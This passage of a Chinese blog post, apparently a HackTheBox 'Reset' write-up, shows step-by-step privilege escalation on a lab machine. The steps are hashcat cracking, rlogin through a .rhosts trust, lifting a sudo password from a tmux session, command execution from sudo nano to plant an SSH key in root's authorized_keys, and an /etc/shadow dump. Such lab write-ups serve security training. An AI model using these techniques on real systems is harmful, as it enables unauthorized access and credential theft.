(key = $salt), HC: 160 JtR: hmac-sha1</span></span><br><span class="line"><span class="string">Haval-128, JtR: haval-128-4</span></span><br><span class="line"><span class="string">RIPEMD-128, JtR: ripemd-128</span></span><br><span class="line"><span class="string">                      </span></span><br><span class="line"><span class="string">Least Likely</span></span><br><span class="line"><span class="string">Double SHA-1, HC: 4500  RIPEMD-160, HC: 6000 JtR: ripemd-160 Haval-160 (3 rounds), HC: </span></span><br><span class="line"><span class="string">6000 JtR: dynamic_190 Haval-160 (4 rounds), HC: 6000 JtR: dynamic_200 Haval-160 (5 </span></span><br><span class="line"><span class="string">rounds), HC: 6000 JtR: dynamic_210 Haval-192 (3 rounds), HC: 6000 JtR: dynamic_220 </span></span><br><span class="line"><span class="string">Haval-192 (4 rounds), HC: 6000 JtR: dynamic_230 Haval-192 (5 rounds), HC: 6000 JtR: </span></span><br><span class="line"><span class="string">dynamic_240 Haval-224 (4 rounds), HC: 6000 JtR: dynamic_260 Haval-224 (5 rounds), HC: 6000</span></span><br><span class="line"><span class="string">JtR: dynamic_270 Haval-160,  Tiger-160,  HAS-160,  LinkedIn, HC: 190 JtR: </span></span><br><span class="line"><span class="string">raw-sha1-linkedin Summary: Hashcat mode is only supported in oclHashcat. Skein-256(160),  </span></span><br><span class="line"><span class="string">Skein-512(160),  MangosWeb Enhanced CMS,  sha1(sha1(sha1($pass))), HC: 4600 Summary: </span></span><br><span class="line"><span class="string">Hashcat mode is only supported in hashcat-legacy. sha1(md5($pass)), HC: 4700  </span></span><br><span class="line"><span class="string">sha1($pass.$salt), HC: 110  sha1($salt.$pass), HC: 120  sha1(unicode($pass).$salt), HC: </span></span><br><span class="line"><span class="string">130  sha1($salt.unicode($pass)), HC: 140  HMAC-SHA1 (key = $pass), HC: 150 JtR: hmac-sha1 </span></span><br><span class="line"><span class="string">sha1($salt.$pass.$salt), HC: 4710  MySQL5.x, HC: 300 JtR: mysql-sha1 MySQL4.1, HC: 300 </span></span><br><span class="line"><span class="string">JtR: mysql-sha1 Cisco Type 7,  BigCrypt, JtR: bigcrypt </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└─$ hashcat -a 0 -m 100 &#x27;</span>b074782af9d530dd9316d26accfd8ff0e4cba29c<span class="string">&#x27; /usr/share/seclists/Pas</span></span><br><span class="line"><span class="string">swords/Leaked-Databases/rockyou.txt.tar.gz </span></span><br><span class="line"><span class="string">hashcat (v6.2.6) starting</span></span><br><span class="line"><span class="string">Session..........: hashcat                                </span></span><br><span class="line"><span class="string">Status...........: Exhausted</span></span><br><span class="line"><span class="string">Hash.Mode........: 100 (SHA1)</span></span><br><span class="line"><span class="string">Hash.Target......: b074782af9d530dd9316d26accfd8ff0e4cba29c</span></span><br><span class="line"><span class="string">Time.Started.....: Sun Jul 20 01:55:55 2025 (10 secs)</span></span><br><span class="line"><span class="string">Time.Estimated...: Sun Jul 20 01:56:05 2025 (0 secs)</span></span><br><span class="line"><span class="string">Kernel.Feature...: Pure Kernel</span></span><br><span class="line"><span class="string">Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz)</span></span><br><span class="line"><span class="string">Guess.Queue......: 1/1 (100.00%)</span></span><br><span class="line"><span class="string">Speed.#1.........:  1525.9 kH/s (2.15ms) @ Accel:1024 Loops:1 Thr:1 Vec:16</span></span><br><span class="line"><span class="string">Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)</span></span><br><span class="line"><span class="string">Progress.........: 14344383/14344383 (100.00%)</span></span><br><span class="line"><span class="string">Rejected.........: 0/14344383 (0.00%)</span></span><br><span class="line"><span class="string">Restore.Point....: 14344383/14344383 (100.00%)</span></span><br><span class="line"><span class="string">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line"><span class="string">Candidate.Engine.: Device Generator</span></span><br><span class="line"><span class="string">Candidates.#1....: $HEX[244361456d40] -&gt; $HEX[042a0337c2a156616d6f732103]</span></span><br><span class="line"><span class="string">Hardware.Mon.#1..: Temp: 58c Util: 26%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Started: Sun Jul 20 01:55:38 2025</span></span><br><span class="line"><span class="string">Stopped: Sun Jul 20 01:56:07 2025</span></span><br></pre></td></tr></table></figure>
+
+<p>果然什么也没有<br>看<code>/home/</code>下面有两个文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@reset:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">local</span>  sadm</span><br><span class="line">www-data@reset:/home$ find .</span><br><span class="line">find .</span><br><span class="line">.</span><br><span class="line">./local</span><br><span class="line">find: <span class="string">&#x27;./local&#x27;</span>: Permission denied</span><br><span class="line">./sadm</span><br><span class="line">./sadm/.bash_logout</span><br><span class="line">./sadm/.profile</span><br><span class="line">./sadm/.bash_history</span><br><span class="line">./sadm/user.txt</span><br><span class="line">./sadm/.cache</span><br><span class="line">find: <span class="string">&#x27;./sadm/.cache&#x27;</span>: Permission denied</span><br><span class="line">./sadm/.bashrc</span><br><span class="line">./sadm/.local</span><br><span class="line">./sadm/.local/share</span><br><span class="line">find: <span class="string">&#x27;./sadm/.local/share&#x27;</span>: Permission denied</span><br><span class="line">./sadm/.rhosts</span><br></pre></td></tr></table></figure>
+
+<p>看一下有在运行什么不</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@reset:/home$ ps -ef | grep sadm</span><br><span class="line">ps -ef | grep sadm</span><br><span class="line">sadm        1214       1  0 01:15 ?        00:00:00 tmux new-session -d -s sadm_session</span><br><span class="line">sadm        1224    1214  0 01:15 pts/3    00:00:00 -bash</span><br><span class="line">www-data    1784    1662  0 01:58 pts/0    00:00:00 grep sadm</span><br></pre></td></tr></table></figure>
+
+<p>照着他的执行一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@reset:/home$ tmux new-session -d -s sadm_session</span><br><span class="line">tmux new-session -d -s sadm_session</span><br><span class="line">www-data@reset:/home$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data),4(adm)</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就多了一个，这时候可以当<code>sadm</code>用了</p>
+<blockquote>
+<p>又笑了，完全理解错了，本身就可以访问sadm下面的文件</p>
+</blockquote>
+<p>在<code>sadm</code>的家目录下有一个<code>rhost</code>，google一下</p>
+<blockquote>
+<p>.rhosts 文件是 Unix&#x2F;Linux 系统上一种用来实现“信任主机”免密码登录的配置文件。<br>举例来说，如果在 sadm 的 ~&#x2F;.rhosts 中写入<code>trusted.host.com   alice</code>,那么当从 <code>trusted.host.com</code>主机上以用户 <code>alice</code> 身份使用 rsh 或 rlogin 登录到本机（且本机用户名也是 sadm）时，就无需输入密码即可直接登录。</p>
+</blockquote>
+<p>那这个可以利用一下，google了一下可以<code>rlogin &lt;IP&gt; -l &lt;username&gt;</code><br>kali上下载<code>rsh-redone-server</code>,然后直接在本机注册一个sadm可不可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ rlogin 10.129.254.174 -l sadm  </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">Password: </span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">Login incorrect</span><br><span class="line">reset login: <span class="built_in">exit</span></span><br><span class="line">Password:       </span><br></pre></td></tr></table></figure>
+
+<p>不行吗<br>su到sadm试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">sudo</span> su - sadm                           </span><br><span class="line">su: warning: cannot change directory to /home/sadm: No such file or directory</span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃                                            </span><br><span class="line">┃ This is a minimal installation of Kali Linux, you likely</span><br><span class="line">┃ want to install supplementary tools. Learn how:</span><br><span class="line">┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/</span><br><span class="line">┃                                                                                         </span><br><span class="line">┗━(Run: “<span class="built_in">touch</span> ~/.hushlogin” to hide this message)</span><br><span class="line">$ rlogin 10.129.254.174 -l sadm</span><br><span class="line">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line"> System information as of Sun Jul 20 10:22:22 AM UTC 2025</span><br><span class="line"></span><br><span class="line">  System load:           0.0</span><br><span class="line">  Usage of /:            65.4% of 5.22GB</span><br><span class="line">  Memory usage:          13%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             230</span><br><span class="line">  Users logged <span class="keyword">in</span>:       1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: 10.129.254.174</span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::250:56ff:feb9:f83c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Applications is not enabled.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: <span class="built_in">sudo</span> pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: <span class="built_in">sudo</span> apt update </span><br><span class="line"></span><br><span class="line">Last login: Wed Jul  9 13:32:23 UTC 2025 from 10.10.14.77 on pts/0</span><br><span class="line">sadm@reset:~$ </span><br></pre></td></tr></table></figure>
+
+<p>登上来了<br><a data-fancybox="gallery" data-src="/images/reset-13.png" data-caption=""><img src="/images/reset-13.png"></a></p>
+<h2 id="Shell-As-Sadm"><a href="#Shell-As-Sadm" class="headerlink" title="Shell As Sadm"></a>Shell As Sadm</h2><p>接着看一下运行的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sadm@reset:~$ ps -ef | grep sadm</span><br><span class="line">sadm        1214       1  0 01:15 ?        00:00:00 tmux new-session -d -s sadm_session</span><br><span class="line">sadm        1224    1214  0 01:15 pts/3    00:00:00 -bash</span><br><span class="line">sadm        6250       1  0 10:22 ?        00:00:00 /lib/systemd/systemd --user</span><br><span class="line">sadm        6251    6250  0 10:22 ?        00:00:00 (sd-pam)</span><br><span class="line">sadm        6261    6148  0 10:22 pts/1    00:00:00 -bash</span><br><span class="line">sadm        6299    6261  0 10:25 pts/1    00:00:00 ps -ef</span><br><span class="line">sadm        6300    6261  0 10:25 pts/1    00:00:00 grep --color=auto sadm</span><br></pre></td></tr></table></figure>
+
+<p>还有tmux，看一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sadm@reset:~$ tmux <span class="built_in">ls</span></span><br><span class="line">sadm_session: 1 windows (created Sun Jul 20 01:15:50 2025)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmux at -t sadm_session</span></span><br><span class="line"><span class="built_in">echo</span> 7lE2PAfVHfjz4HpE | <span class="built_in">sudo</span> -S nano /etc/firewall.sh</span><br><span class="line">sadm@reset:~$ <span class="built_in">echo</span> 7lE2PAfVHfjz4HpE | <span class="built_in">sudo</span> -S nano /etc/firewall.sh</span><br><span class="line">Too many errors from stdin</span><br><span class="line">sadm@reset:~$ :&gt;|tmux 3.5a^[\</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/images/reset-14.png" data-caption=""><img src="/images/reset-14.png"></a></p>
+<p>这个时候可以直接<code>sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sadm@reset:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sadm on reset:</span><br><span class="line">    env_reset, timestamp_timeout=-1, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty, !syslog</span><br><span class="line"></span><br><span class="line">User sadm may run the following commands on reset:</span><br><span class="line">    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh</span><br><span class="line">    (ALL) PASSWD: /usr/bin/tail /var/log/syslog</span><br><span class="line">    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log</span><br><span class="line">sadm@reset:~$ </span><br></pre></td></tr></table></figure>
+
+<p>可以nano，进去看看</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-15.png" data-caption=""><img src="/images/reset-15.png"></a></p>
+<p>下面可以读文件，现在是sudo，那不可以直接读root.txt了</p>
+<p>然后就会得到<code> [ File &quot;/root/root.txt&quot; not found ]</code></p>
+<p>hhh</p>
+<p>那看一下有什么吧<code>Ctrl+T</code></p>
+<p><a data-fancybox="gallery" data-src="/images/reset-16.png" data-caption=""><img src="/images/reset-16.png"></a></p>
+<p>舒服，可以直接把<code>authorized_keys</code>写进去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ctrl + T </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;xxx.pub&#x27;</span> &gt; /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># login at attack</span></span><br><span class="line">└─$ ssh -i .ssh/id_ed25519 root@10.129.254.174</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.129.254.174 (10.129.254.174)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:HFXQA4H5wiZsaBpe1Ymxvzg72KiVi0uEjib0GxsYF30.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.129.254.174<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information as of Sun Jul 20 10:35:39 AM UTC 2025</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:           0.01</span></span><br><span class="line"><span class="string">  Usage of /:            65.5% of 5.22GB</span></span><br><span class="line"><span class="string">  Memory usage:          14%</span></span><br><span class="line"><span class="string">  Swap usage:            0%</span></span><br><span class="line"><span class="string">  Processes:             241</span></span><br><span class="line"><span class="string">  Users logged in:       1</span></span><br><span class="line"><span class="string">  IPv4 address for eth0: 10.129.254.174</span></span><br><span class="line"><span class="string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:f83c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Apps to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jun  4 15:06:11 2025</span></span><br><span class="line"><span class="string">root@reset:~# </span></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/images/reset-17.png" data-caption=""><img src="/images/reset-17.png"></a></p>
+<h2 id="Shell-As-Root"><a href="#Shell-As-Root" class="headerlink" title="Shell As Root"></a>Shell As Root</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@reset:~# <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$y$j9T<span class="variable">$OniQxC779</span>.rvh5CTo2gFt/<span class="variable">$PKZUgR0Chbrz0VjvQXKLti</span>/EUBcjMUfLRkWWN1muml7:20063:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:20063:0:99999:7:::</span><br><span class="line"><span class="built_in">local</span>:$y$j9T<span class="variable">$pUnbOE3XjJN</span>.WjLUd.EB10<span class="variable">$j0zUF9YtKbvHzNtIgK</span>/lOMu7wbyVEp84NGQ.9WDwKX0:20063:0:99999:7:::</span><br><span class="line">lxd:!:20063::::::</span><br><span class="line">sadm:$y$j9T<span class="variable">$x5yW</span>.4UKg1aq7pjlFl4/G0<span class="variable">$AQGX5Fviy9lSm8idbb93DoX8PHn58JQXM2XuHyrS8g</span>/:20063:0:99999:7:::</span><br><span class="line">_laurel:!:20241::::::</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Next-Day"><span class="toc-number">1.1.</span> <span class="toc-text">Next Day</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Www-data"><span class="toc-number">2.</span> <span class="toc-text">Shell As Www-data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Sadm"><span class="toc-number">3.</span> <span class="toc-text">Shell As Sadm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root"><span class="toc-number">4.</span> <span class="toc-text">Shell As Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">4.1.</span> <span class="toc-text">Hashes</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/07/22/Reset/Reset/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&text=HackTheBox——HTB Reset Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&is_video=false&description=HackTheBox——HTB Reset Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Reset Writeup&body=Check out this article: https://n0nome.github.io/2025/07/22/Reset/Reset/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&name=HackTheBox——HTB Reset Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/07/22/Reset/Reset/&t=HackTheBox——HTB Reset Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    n0nome
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
